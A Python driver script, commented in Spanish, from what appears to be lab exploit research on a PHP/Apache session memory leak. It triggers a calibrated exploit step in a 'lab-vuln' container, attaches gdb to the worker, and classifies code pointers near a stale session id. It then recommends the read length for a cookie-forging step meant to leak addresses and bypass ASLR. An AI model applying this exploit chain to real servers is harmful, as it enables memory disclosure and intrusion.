#!/usr/bin/env python3
"""
off_leak_e1.py — driver del barrido E1 de la ventana bajo display_errors=Off.

Contexto (PR #34): bajo Off el id stale queda en el chunk cacheado y la
HashTable de sesion (pDestructor -> libphp) queda 8.7 MB lejos. Ese analisis
midio el camino de la HashTable de 9bie; el PR #35 barrio ademas la ventana
completa desde la cookie. Este instrumento repite el barrido desde el worker
con gdb y clasifica los punteros por tipo. La ventana esta acotada por el fin
del chunk (8168 B desde idval), no por una cabecera de Apache.

Que hace el driver (solo lectura del worker, sin reiniciar Apache):

  1. Ejecuta A por shell-out --a-cmd (verbatim, tal como esta calibrado:
     el puerto va hardcodeado en el script del A).
  2. Localiza el pid del worker (ps dentro del contenedor + pidfile; un solo
     hijo prefork en los contenedores calibrados).
  3. Copia off_leak_e1.gdb al contenedor y lo pasa con -x a
     `docker exec gdb -q -batch -nx -p <pid>`. gdb parado en attach, solo
     lee memoria (gdb -batch ignora stdin).
  4. Clasifica las ventanas de 8 bytes del tramo idval..fin-de-chunk y
     entrega un veredicto con la lectura recomendada para B.

Oraculo / veredictos:
  - DTOR exacto a distancia D <= --cookie-cap : RESCUE -> B con --read D+8;
    exito en E2 si la cookie decodificada contiene ese qword en D.
  - solo libphp a distancia <= cap           : CANDIDATES -> triage manual
    de alineacion (align56 == 48 = pDestructor de bloque de 56 B).
  - ningun puntero de codigo en la ventana total (8192 B) : KILL_WINDOW
    -> confirma la conclusion del PR #34 en todo el remanente; siguiente
    frontera: reubicar PS(id) (Siguiente 1 del PR #34) o cerrar el PoC
    Off como dependiente de ASLR apagado.
  - puntero solo mas alla del cap            : BEYOND_CAP.

Uso (en un host con ptrace/gdb; no desde el orquestador):
    python3 off_leak_e1.py \
        --container lab-vuln \
        --a-cmd 'python3 ./9bie/send_a_oom5_193.py \
                 0 63 235 15000 208 4 4000 103' \
        --out off_leak_e1_result.csv

Disciplina: no reinicia Apache, no reimplementa payload, no toca
contenedores ajenos a --container.
"""

from __future__ import annotations

import argparse
import csv
import subprocess
import sys
import time
from pathlib import Path

# Cap fisico de lectura cruda: el id cae en la pagina 510 del chunk de 2 MB,
# asi que de idval al fin del chunk quedan 2*4096 - 0x18 = 8168 B. Leer mas
# toca memoria no mapeada. (LimitRequestFieldSize aplica a peticiones, no a
# la respuesta; ver PR #35.)
DEFAULT_COOKIE_CAP = 8168


def run(argv: list[str], **kw) -> subprocess.CompletedProcess:
    return subprocess.run(argv, capture_output=True, text=True, **kw)


def check_gdb(container: str) -> None:
    r = run(['docker', 'exec', container, 'sh', '-c', 'command -v gdb'])
    if r.returncode != 0 or not r.stdout.strip():
        sys.exit('[FAIL] gdb no esta instalado en %s' % container)


def run_a(a_cmd: str) -> str:
    r = subprocess.run(a_cmd, shell=True, capture_output=True, text=True,
                       timeout=180)
    tail = (r.stdout[-400:] + ' ' + r.stderr[-200:]).strip()
    print('[A] rc=%d  %s' % (r.returncode, tail.replace('\n', ' | ')[:300]))
    return tail


def resolve_worker(container: str, child_pid: str | None) -> int:
    """Devuelve el pid del worker en el namespace del contenedor.

    No usar `docker top`: imprime pids del host y `gdb -p` dentro del
    contenedor espera pids del namespace interno. Se consulta con ps dentro
    del contenedor.
    """
    if child_pid:
        return int(child_pid)

    master = None
    r = run(['docker', 'exec', container,
             'cat', '/var/run/apache2/apache2.pid'])
    if r.returncode == 0 and r.stdout.strip().isdigit():
        master = int(r.stdout.strip())

    r = run(['docker', 'exec', container,
             'sh', '-c', 'ps -eo pid=,ppid=,comm='])
    if r.returncode != 0:
        sys.exit('[FAIL] ps en el contenedor: %s' % r.stderr.strip())
    procs = []
    for line in r.stdout.splitlines():
        parts = line.split(None, 2)
        if len(parts) == 3:
            procs.append((int(parts[0]), int(parts[1]), parts[2].strip()))
    if master is None:
        cand = [p for p in procs if 'apache2' in p[2]]
        if not cand:
            sys.exit('[FAIL] sin proceso apache2 visible en el contenedor')
        master = min(cand)[0]  # el mas viejo es el master
    kids = [p for p in procs if p[1] == master and p[0] != master
            and 'apache2' in p[2]]
    if len(kids) == 1:
        pid = kids[0][0]
    elif len(kids) == 0:
        sys.exit('[FAIL] sin workers apache2 bajo el master %d' % master)
    else:
        sys.exit('[FAIL] hay %d workers; elegir con --child-pid %s'
                 % (len(kids), ' o '.join(str(p[0]) for p in kids)))
    print('[worker] pid=%d (master=%d)' % (pid, master))
    return pid


def run_gdb(container: str, pid: int, script_path: Path,
            dtor_offset: str | None) -> str:
    # gdb -batch ignora stdin: el script debe ser un archivo real dentro del
    # contenedor y pasarse con -x.
    remote = '/tmp/off_leak_e1_%d.gdb' % pid
    r = run(['docker', 'cp', str(script_path),
             '%s:%s' % (container, remote)])
    if r.returncode != 0:
        sys.exit('[FAIL] docker cp del script gdb: %s' % r.stderr.strip())
    argv = ['docker', 'exec']
    if dtor_offset:
        argv += ['-e', 'GDB_E1_DTOR_OFFSET=%s' % dtor_offset]
    argv += [container, 'gdb', '-q', '-batch', '-nx', '-p', str(pid),
             '-x', remote]
    r = subprocess.run(argv, capture_output=True, text=True, timeout=120)
    if '===E1_BEGIN===' not in r.stdout:
        tail = (r.stdout + r.stderr)[-500:]
        sys.exit('[FAIL] gdb sin salida E1:\n%s' % tail)
    return r.stdout


def parse_e1(out: str) -> dict:
    hdr = {}
    hits = []
    counts = {}
    lines = out.split('===E1_BEGIN===', 1)[1]
    lines = lines.split('===E1_END===', 1)[0].strip().splitlines()
    for ln in lines:
        fields = [f.strip() for f in ln.strip().split(',')]
        if not fields:
            continue
        if fields[0] == 'hdr':
            for i in range(1, len(fields) - 1, 2):
                hdr[fields[i]] = fields[i + 1]
        elif fields[0] == 'hit':
            row = dict(zip(fields[1::2], fields[2::2]))
            hits.append({'pos': int(row['pos']), 'cls': row['cls'],
                         'qw': row['qw'], 'align56': int(row['align56']),
                         'align64': int(row['align64'])})
        elif fields[0] == 'counts':
            counts = dict(zip(fields[1::2], fields[2::2]))
    return {'hdr': hdr, 'hits': hits, 'counts': counts}


def verdict(parsed: dict, cap: int) -> tuple[str, int | None]:
    hits = parsed['hits']
    dtor = [h for h in hits if h['cls'] == 'DTOR']
    lib = [h for h in hits if h['cls'] == 'libphp']
    code = sorted(dtor + lib, key=lambda h: h['pos'])

    in_cap = [h for h in code if h['pos'] + 8 <= cap]
    if not code:
        return 'KILL_WINDOW', None
    if not in_cap:
        near = code[0]
        return 'BEYOND_CAP(pos=%d)' % near['pos'], near['pos'] + 8

    best = in_cap[0]
    reco = best['pos'] + 8
    if best['cls'] == 'DTOR':
        tag = 'RESCUE_DTOR'
    elif best['cls'] == 'libphp' and best['align56'] == 48:
        tag = 'RESCUE_LIBPHP_PDTOR56'
    else:
        tag = 'CANDIDATES_LIBPHP'
    return tag, reco


def main() -> None:
    ap = argparse.ArgumentParser(
        description='Barrido E1: punteros de codigo en la ventana bajo Off')
    ap.add_argument('--container', required=True)
    ap.add_argument('--a-cmd', required=True,
                    help='comando A calibrado verbatim (puerto hardcodeado)')
    ap.add_argument('--gdb-script', default=None,
                    help='default: off_leak_e1.gdb junto a este driver')
    ap.add_argument('--child-pid', default=None,
                    help='forzar el pid del worker')
    ap.add_argument('--dtor-offset', default=None,
                    help='offset hex de zval_ptr_dtor si el simbolo no existe')
    ap.add_argument('--cookie-cap', type=int, default=DEFAULT_COOKIE_CAP)
    ap.add_argument('--post-a-sleep', type=float, default=0.5)
    ap.add_argument('--skip-a', action='store_true',
                    help='no reejecutar A (ya corrrio en este worker)')
    ap.add_argument('--out', default='off_leak_e1_result.csv')
    args = ap.parse_args()

    script_path = (Path(args.gdb_script) if args.gdb_script
                   else Path(__file__).with_name('off_leak_e1.gdb'))
    if not script_path.exists():
        sys.exit('[FAIL] sin script gdb: %s' % script_path)

    check_gdb(args.container)
    if not args.skip_a:
        run_a(args.a_cmd)
        time.sleep(args.post_a_sleep)

    pid = resolve_worker(args.container, args.child_pid)
    raw = run_gdb(args.container, pid, script_path, args.dtor_offset)
    parsed = parse_e1(raw)

    hdr = parsed['hdr']
    print('\n=== RESULTADO E1 ===')
    print('libphp=%s..%s  dtor=%s (%s)'
          % (hdr.get('libphp_base'), hdr.get('libphp_end'),
             hdr.get('dtor'), hdr.get('dtor_src')))
    print('id=%s page_off=%s chunk=%s scan_len=%s'
          % (hdr.get('id'), hdr.get('page_off'), hdr.get('chunk'),
             hdr.get('scan_len')))
    print('counts:', parsed['counts'])

    for h in parsed['hits'][:40]:
        print('  hit pos=%-5d cls=%-6s qw=%s align56=%d'
              % (h['pos'], h['cls'], h['qw'], h['align56']))

    tag, reco = verdict(parsed, args.cookie_cap)
    print('\nveredicto: %s' % tag)
    if reco:
        within = reco <= args.cookie_cap
        print('read recomendado para B (--read %d de b_forge.py)%s'
              % (reco, '' if within else ' [FUERA DEL CAP]'))
        if tag.startswith('RESCUE_DTOR') and within:
            print('criterio de exito E2: la cookie decodificada contiene el')
            print('qword dtor=%s en el offset %d.' % (hdr.get('dtor'), reco - 8))

    # CSV
    with open(args.out, 'w', newline='') as f:
        w = csv.writer(f)
        w.writerow(['section', 'key', 'value'])
        for k, v in hdr.items():
            w.writerow(['hdr', k, v])
        for k, v in parsed['counts'].items():
            w.writerow(['counts', k, v])
        w.writerow(['verdict', 'tag', tag])
        w.writerow(['verdict', 'read_reco', reco or '',
                    'cookie_cap', args.cookie_cap])
        w.writerow([])
        w.writerow(['pos', 'cls', 'qw', 'align56', 'align64'])
        for h in parsed['hits']:
            w.writerow([h['pos'], h['cls'], h['qw'],
                        h['align56'], h['align64']])
    print('\n[ok] evidencia en %s' % args.out)


if __name__ == '__main__':
    main()
